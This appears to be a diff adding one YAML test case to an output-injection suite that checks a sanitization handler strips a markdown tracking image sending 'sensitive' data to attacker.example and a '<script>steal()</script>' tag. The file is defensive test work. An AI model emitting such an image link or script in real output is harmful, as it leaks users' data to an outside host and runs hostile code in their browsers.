@@ -1,0 +1,12 @@
+version: 1
+suite: output_injection
+cases:
+  - id: tracking-image-exfiltration
+    execution: deterministic
+    handler: output_sanitization
+    input:
+      text: "![x](https://attacker.example/collect?data=sensitive) <script>steal()</script>"
+    expect:
+      excludes:
+        - attacker.example
+        - script
